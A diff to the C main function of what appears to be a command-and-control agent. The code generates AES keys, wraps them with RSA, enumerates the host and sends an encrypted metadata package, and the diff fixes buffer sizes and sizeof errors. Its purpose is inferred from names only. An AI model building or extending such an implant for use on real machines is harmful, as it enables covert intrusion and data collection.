@@ -29,21 +29,21 @@ int main()
     wc_InitRng(&rng);
 
     //generate aeskey and iv
-    byte* EncryptedAesKey = (byte*)malloc(sizeof(byte) * 150);
-    byte* EncryptedIV = (byte*)malloc(sizeof(byte) * 150);
+    byte* EncryptedAesKey = (byte*)malloc(sizeof(byte) * 500);
+    byte* EncryptedIV = (byte*)malloc(sizeof(byte) * 500);
     byte* AesKey = (byte*)malloc(sizeof(byte) * AES_256_KEY_SIZE);
     byte* AesIV = (byte*)malloc(sizeof(byte) * AES_BLOCK_SIZE);
-    MemorySet(EncryptedAesKey, 0, 150);
-    MemorySet(EncryptedIV, 0, 150);
+    MemorySet(EncryptedAesKey, 0, 500);
+    MemorySet(EncryptedIV, 0, 500);
     MemorySet(AesKey, 0, AES_256_KEY_SIZE);
     MemorySet(AesIV, 0, AES_BLOCK_SIZE);
 
-    wc_RNG_GenerateBlock(&rng, AesKey, sizeof(AesKey));
-    wc_RNG_GenerateBlock(&rng, AesIV, sizeof(AesIV));
+    wc_RNG_GenerateBlock(&rng, AesKey, AES_256_KEY_SIZE);
+    wc_RNG_GenerateBlock(&rng, AesIV, AES_BLOCKLEN);
 
     //encrypt aes key
-    word32 EncryptedKeySize = wc_RsaPublicEncrypt(AesKey, sizeof(AesKey), EncryptedAesKey, 150, &rsaPublicKey, &rng);
-    word32 EncryptedIvSize = wc_RsaPublicEncrypt(AesIV, AES_BLOCK_SIZE, EncryptedIV, 150, &rsaPublicKey, &rng);
+    word32 EncryptedKeySize = wc_RsaPublicEncrypt(AesKey, AES_256_KEY_SIZE, EncryptedAesKey, 500, &rsaPublicKey, &rng);
+    word32 EncryptedIvSize = wc_RsaPublicEncrypt(AesIV, AES_BLOCK_SIZE, EncryptedIV, 500, &rsaPublicKey, &rng);
     wc_FreeRng(&rng);
 
    //encrypt iv
@@ -71,20 +71,19 @@ int main()
     AgentData.packages = pPack;
     AddPackageToAgentPackageList(&AgentData, pPack);
 
-    if ((err = AddInt32ToPackage(AgentData.packages, AgentData.EncryptedAESKeySize)) != PACKAGE_SUCCESS) {
-        printf("[error] attempting to add aes key length to package\n");
-        return -1;
-    }
-
+    //if ((err = AddInt32ToPackage(AgentData.packages, AgentData.EncryptedAESKeySize)) != PACKAGE_SUCCESS) {
+    //    printf("[error] attempting to add aes key length to package\n");
+    //    return -1;
+    //}
     if ((err = AddBytesToPackage(AgentData.packages, AgentData.EncryptedAESKey, AgentData.EncryptedAESKeySize)) != PACKAGE_SUCCESS)
     {
         printf("[error] attempting to add aes key to package\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(AgentData.packages, AgentData.EncryptedIVSize)) != PACKAGE_SUCCESS) {
-        printf("[error] attempting to add IV length to package\n");
-        return -1;
-    }
+    //if ((err = AddInt32ToPackage(AgentData.packages, AgentData.EncryptedIVSize)) != PACKAGE_SUCCESS) {
+    //    printf("[error] attempting to add IV length to package\n");
+    //    return -1;
+    //}
     if ((err = AddBytesToPackage(AgentData.packages, AgentData.EncryptedIV, AgentData.EncryptedIVSize)) != PACKAGE_SUCCESS)
     {
         printf("[error] attempting to add aes key to package\n");
@@ -93,12 +92,36 @@ int main()
 
     Enumerate(&AgentData);
 
-    if ((err = AddStringToPackage(AgentData.packages, "ENCRYPTION TEST")) != PACKAGE_SUCCESS) {
+    if ((err = AddStringToPackage(AgentData.packages, "ENCRYPTION TEST!!! THIS IS AN ENCRYPTION TEST!!\nLOLOLOLTEST%%$@(((*@)_#\n123400")) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add the dummy data to encrypted\n");
         return -1;
     }
-
-
+/*
+    printf("Encrypted AES Key: \n{ ");
+    for (int i = 0; i < AgentData.EncryptedAESKeySize; i++)
+    {
+        printf("0x%02X, ", AgentData.EncryptedAESKey[i]);
+    }
+    printf("}\n");
+    printf("Encrypted IV Key: \n{ ");
+    for (int i = 0; i < AgentData.EncryptedIVSize; i++)
+    {
+        printf("0x%02X, ", AgentData.EncryptedIV[i]);
+    }
+    printf("}\n");
+    printf(" AES Key: \n{ ");
+    for (int i = 0; i < AgentData.AESKeySize; i++)
+    {
+        printf("0x%02X, ", AgentData.AESKey[i]);
+    }
+    printf("}\n");
+    printf("IV Key: \n{ ");
+    for (int i = 0; i < AgentData.IVSize; i++)
+    {
+        printf("0x%02X, ", AgentData.IV[i]);
+    }
+    printf("}\n");
+*/
     PackageSendMetaDataPackage(AgentData.packages, NULL, NULL, &AgentData);
 }
 
